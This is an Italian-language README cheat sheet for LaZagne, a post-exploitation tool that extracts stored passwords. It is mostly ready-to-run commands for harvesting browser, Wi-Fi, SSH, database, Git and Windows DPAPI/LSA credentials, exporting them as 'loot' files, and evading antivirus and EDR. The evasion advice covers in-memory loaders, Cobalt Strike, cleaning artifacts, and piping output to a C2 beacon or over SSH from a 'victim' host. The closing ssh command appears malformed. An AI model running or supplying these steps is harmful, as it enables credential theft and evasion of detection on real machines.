<!-- language-home-navigation -->
[🏠 Home Page Italiana](../../README.it.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇪🇸 Español](README.es.md) • [🇫🇷 Français](README.fr.md)

[🇵🇹 Português](README.pt.md) • [🇷🇺 Русский](README.ru.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇸🇦 العربية](README.ar.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)

---


# LaZagne Cheatsheet

[LaZagne](https://github.com/AlessandroZ/LaZagne) è un'applicazione post-exploitation open source utilizzata per recuperare le password archiviate su un computer locale. Supporta Windows, Linux e macOS in più categorie tra cui browser Web, client di posta elettronica, reti Wi-Fi, software di gestione di database, strumenti di amministrazione di sistema e cache di memoria.

---

## Sommario

- [Moduli e categorie supportati](#moduli-supportati--categorie)
- [Installazione e binari](#installazione--binari)
- [Raccolta di credenziali Linux](#linux-credential-harvesting)
- [Raccolta di credenziali Windows](#windows-credential-harvesting)
- [Attacchi di categoria mirata](#attacchi-di-categoria-mirata)
- [Formati di output ed esportazione di file](#formati-output--esportazione-file)
- [Sicurezza operativa e prevenzione EDR](#sicurezza-operativa--edr-avoidance)

---

## Moduli e categorie supportati

LaZagne estrae credenziali da decine di applicazioni raggruppate in categorie:
- **Browser:** Chrome, Firefox, Edge, Opera, Brave, Chromium (cronologia, compilazione automatica, cookie, credenziali).
- **Strumenti di amministrazione di sistema:** WinSCP, PuTTY, OpenSSH (chiavi/configurazione `id_rsa`), RDP/mstsc, FileZilla, Cyberduck, VNC.
- **Database:** DBeaver, pgAdmin, Squirrel, Robomongo, SQL Server Management Studio.
- **Wi-Fi:** Chiavi precondivise WPA2/WPA3 (PSK) memorizzate nei profili di rete del sistema operativo.
- **Sviluppatore e VCS:** Credenziali Git (`.git-credentials`, cache), SVN, token Docker, credenziali AWS CLI.
- **E-mail e chat:** Thunderbird, Outlook, Pidgin, Skype.
- **Windows Vault e DPAPI:** segreti LSA, chiavi master DPAPI, elementi del vault di Credential Manager.

---

## Installazione e file binari
```bash
# Clone the repository
git clone https://github.com/AlessandroZ/LaZagne.git
cd LaZagne

# Install Python dependencies (for running source on Linux)
pip install -r requirements.txt

# Or download pre-compiled standalone binaries (releases page)
# Windows: lazagne.exe
# Linux: laZagne.py
```
---

## Raccolta delle credenziali Linux

### 1. Esegui tutti i moduli di estrazione
```bash
python3 laZagne.py all
```
### 2. Esegui con privilegi Root/Sudo (espande l'accesso Shadow e Keyring)
L'esecuzione come `root` sblocca i segreti di sistema, i profili Wi-Fi in `/etc/NetworkManager` e le chiavi SSH in tutte le directory `/home/*`:
```bash
sudo python3 laZagne.py all
```
### 3. Estrai le password dal portachiavi Gnome / KWallet
```bash
python3 laZagne.py sysadmin -k
```
---

## Raccolta delle credenziali di Windows

Su Windows, utilizzare l'eseguibile autonomo `lazagne.exe`:

### 1. Estrai tutte le password memorizzate
```cmd
lazagne.exe all
```
### 2. Esegui con privilegi elevati (Amministratore/SISTEMA)
Estrai le chiavi master DPAPI, i segreti LSA e le credenziali del dominio memorizzato nella cache:
```cmd
lazagne.exe all -v
```
### 3. Estrarre le password per un utente specifico (quando si esegue come amministratore)
```cmd
lazagne.exe all -path "C:\Users\TargetUser\AppData"
```
---

## Attacchi di categoria mirati

Invece di eseguire tutti i moduli, specifica le categorie del software di destinazione per ridurre al minimo l'attività e il rumore del disco:

### 1. Solo browser Web
```bash
# Linux
python3 laZagne.py browsers

# Windows
lazagne.exe browsers
```
### 2. Password Wi-Fi in chiaro
```bash
# Linux (requires root or sudo)
sudo python3 laZagne.py wifi

# Windows
lazagne.exe wifi
```
### 3. Strumenti di amministrazione di sistema e di accesso remoto (SSH, RDP, WinSCP, FileZilla)
```bash
# Linux
python3 laZagne.py sysadmin

# Windows
lazagne.exe sysadmin
```
### 4. Client del database
```bash
# Linux
python3 laZagne.py databases

# Windows
lazagne.exe databases
```
### 5. Credenziali sviluppatore e Git
```bash
# Linux
python3 laZagne.py git
```
---

## Formati di output ed esportazione di file

Salva le credenziali raccolte direttamente su disco in formati strutturati:

### Esporta in formato JSON
```bash
python3 laZagne.py all -oJ -oN /tmp/loot_credentials
```
Crea `/tmp/loot_credentials.json` contenente credenziali strutturate, URL, nomi utente e password in testo semplice.

### Esporta in testo semplice
```bash
python3 laZagne.py all -oT -oN /tmp/loot_credentials
```
Crea `/tmp/loot_credentials.txt`.

---

## Sicurezza operativa ed prevenzione degli EDR

- **Rilevamento antivirus:** `lazagne.exe` autonomo è fortemente firmato da Windows Defender e da soluzioni EDR commerciali.
- **Offuscamento ed esecuzione in memoria:**
  - Esegui tramite riflessione PowerShell o caricatori in memoria (`donut`, `execute-assembly` in Cobalt Strike / Sliver).
  - Utilizzare la versione sorgente Python con un ambiente virtuale personalizzato anziché il binario PyInstaller compresso.
- **Pulisci gli artefatti:** elimina i file di bottino temporanei o reindirizza l'output direttamente tramite l'uscita standard su un beacon C2 crittografato o una sessione SSH:
  ```bash
  ssh victim@192.168.1.50 'python3 -' < laZagne.py all
  ```